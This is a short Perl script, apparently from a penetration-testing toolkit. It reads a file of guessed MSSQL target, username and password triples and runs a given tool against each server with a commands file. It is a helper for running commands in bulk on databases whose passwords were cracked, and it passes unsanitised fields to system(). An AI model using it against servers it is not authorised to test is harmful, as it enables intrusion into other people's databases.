# Usage: RunUsingGuessedPasswords.pl <tool name> GuessedMSSQLPasswords.txt

use strict;

my($strLine)      = "";
my(@strLineSplit) = ();
my($strTarget)    = "";
my($strUsername)  = "";
my($strPassword)  = "";

if (open(INPUT, "< $ARGV[1]"))
{
	while (<INPUT>)
	{
		$strLine = $_;

		$strLine =~ s/^\s+//;
		$strLine =~ s/\s+$//;

		chomp($strLine);

		if ($strLine =~ /\t/)
		{
			@strLineSplit = split(/\t/, $strLine);

			$strTarget   = $strLineSplit[0];
			$strUsername = $strLineSplit[1];
			$strPassword = $strLineSplit[2];

			if (uc($strPassword) eq "<BLANK>")
			{
				$strPassword = "";
			}

			system("$ARGV[0] $strTarget $strUsername \"$strPassword\" commands.txt");

			print "\n";
		}
	}

	close(INPUT);
}

# Written by Reed Arvin | reedarvin@gmail.com